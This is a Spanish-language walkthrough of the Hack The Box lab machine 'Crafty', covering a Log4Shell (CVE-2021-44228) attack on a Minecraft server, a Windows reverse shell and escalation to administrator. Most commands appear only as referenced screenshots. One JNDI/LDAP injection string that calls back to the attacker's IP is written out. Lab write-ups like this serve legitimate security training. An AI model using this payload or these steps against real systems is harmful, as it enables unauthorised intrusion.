--------

Empezamos con la resolución de la máquina, haciendo un **ping** para comprobar si tenemos conexión:

![1](images/1.png)

Podemos ver que hay conexión, enviamos un paquete y recibimos un paquete.

El siguiente paso es **escanear los puertos abiertos** de la máquina víctima para ver por donde podemos entrar, para ello usamos _nmap_ para primero hacer un escaneo sencillo:

![2](images/2.png)

Esta máquina es algo rara porque aunque tiene **2 puertos abiertos**, uno de ellos tiene un servicio de ***minecraft***. 

Me puse a escanear los puertos abiertos con más profundidad y encontré esto: 

![3](images/3.png)

Se puede ver que hay un dominio llamado **crafty.htb**, vamos a incluirlo al archivo */etc/hosts* para ver a donde nos lleva:

![4](images/4.png)

Al poner el dominio en el navegador, nos llevará aquí: 

![5](images/5.png)

![6](images/6.png)

Parece ser un servidor de Minecraft y no hay nada de datos útiles a primera vista, así que podemos buscar contenido oculto en la web con **gobuster**: 

![7](images/7.png)

![8](images/8.png)

No encontré nada realmente útil aunque volviendo hacia el escaneo con **nmap** se puede ver una versión de Minecraft:

![46](images/46.png)

Encontré esta web que habla de una vulnerabilidad de **log4j** que afecta a esta versión de Minecraft: 

![9](images/9.png)

![10](images/10.png)

Para poder conectarse al servidor de Minecraft, podemos descargarnos esta herramienta: 

![11](images/11.png)

![12](images/12.png)

Este programa se encuentra en un repositorio de GitHub y es compatible con varios sistemas operativos, en este caso, usaremos para Linux:

![13](images/13.png)

Al ejecutarlo, veremos esto:

![14](images/14.png)

Nos pedirá la IP de la máquina víctima, aunque podemos poner el nombre de dominio ***crafty.htb*** y funcionará igual:

![15](images/15.png)

Lo que tendremos con esto es una terminal en donde podremos ejecutar comandos, pero la dejaremos a un lado porque la usaremos más adelante para ganar acceso a la máquina. 

Empezando a buscar vulnerabilidades para esta máquina, estuve tratando de buscar por códigos CVE que me dieran ideas sobre que tipo de ataque podría hacer, y encontré esto:

![18](images/18.png)

![19](images/19.png)

Aquí podemos ver una instrucción que se registra con el CVE-2021-44228, que es el CVE que se registra con la vulnerabilidad.

![20](images/20.png)

En esta misma sección podremos ver un **payload** que usaremos para tener acceso a la máquina más adelante:

![21](images/21.png)

Podemos modificar esta instrucción de esta forma: 

```bash
${jndi:ldap://10.10.16.94/test}
```

Incluimos esto en la consola del servidor de Minecraft y nos ponemos en escucha por el **puerto  389**: 

![24](images/24.png)

Hemos recibido una conexión del servidor tratando de acceder al recurso, esto demuestra que el servidor es vulnerable a este tipo de ataques con LDAP. 

Con esto ya en mente, estuve buscando **POCS** del tipo **log4shell** en GitHub basándome en el CVE que encontré antes:

![25](images/25.png)

En este resultado encontré un montón de repositorios con este CVE:

![26](images/26.png)

Elegimos este: 

![27](images/27.png)

Si lo clonamos y vemos que hay dentro, veremos esto:

![28](images/28.png)

De primeras solo hay que ejecutar el archivo de Python, pero nos pedirá descargar alguna dependencia:

![29](images/29.png)

Para descargarnos esto, nos dirigimos aquí: 

![32](images/32.png)

![33](images/33.png)

Descomprimimos el archivo y muy importante cambiar el nombre de esta forma:

![34](images/34.png)

![35](images/35.png)

Nos lo llevamos al mismo directorio donde se encuentra el archivo de Python: 

![36](images/36.png)

Y antes de ejecutarlo, editamos el archivo para cambiar el ***/bin/bash*** por ***cmd.exe***: (esto lo hacemos porque la máquina es Windows) 

![39](images/39.png)

![40](images/40.png)

Ahora nos ponemos en escucha en nuestra máquina atacante: 

![37](images/37.png)

Ejecutamos el archivo de Python de esta forma para configurar los parámetros hacia nuestra máquina atacante:

![43](images/43.png)

Nos aparecerá este payload tras ejecutarlo: 

![42](images/42.png)

Esto mismo lo ponemos en el servidor de Minecraft, y si todo fue correcto: 

![44](images/44.png)

Ya tenemos una reverse shell en Windows, y podemos ver la primera flag:

![45](images/45.png)

Ahora pasamos a la parte de escalar privilegios del sistema, encontré este directorio **plugins** en el que encontré este archivo '.jar':
 
![48](images/48.png)

Podemos ver el contenido de este archivo en nuestra máquina atacante, pero debemos transferirlo primero, podemos hacerlo con un  **servidor smb**:

![49](images/49.png)

Ahora nos conectamos con la máquina víctima al servidor: 

![50](images/50.png)

A partir de aquí usaremos **Powershell** para no tener problemas con los comandos:

![51](images/51.png)

Copiamos el archivo .jar al servidor, con esto ya lo tendremos en la máquina atacante:

![52](images/52.png)

Para acceder al contenido del archivo, podemos usar la herramienta **jd-gui**: 

![53](images/53.png)

Desde aquí, accedemos al archivo: 

![54](images/54.png)

Buscando por dentro, encontré esto que parece ser una contraseña:

![55](images/55.png)

Ahora bien, para poder ejecutar cosas como administrador, me cloné esta herramienta de GitHub: 

![56](images/56.png)

Solo necesitamos el archivo **.exe**:

![58](images/58.png)

Para asegurarme de que el archivo se transfiere bien, lo moví a la sección del sistema Linux donde tenía los archivos compartidos con el servidor SMB:

![59](images/59.png)

Abrimos un servidor con Python:

![60](images/60.png)

Ahora desde la máquina víctima, nos copiamos el archivo, en este caso yo lo hice desde el directorio **Temp** en una carpeta propia: 

![61](images/61.png)

Nos mandaremos una reverse shell para escalar privilegios, primero nos ponemos en escucha:

![64](images/64.png)

Desde aquí, podemos lanzarnos una reverse shell con este comando: 

![63](images/63.png)

Y si todo va bien, ya podremos ser administrador del sistema: 

![65](images/65.png)


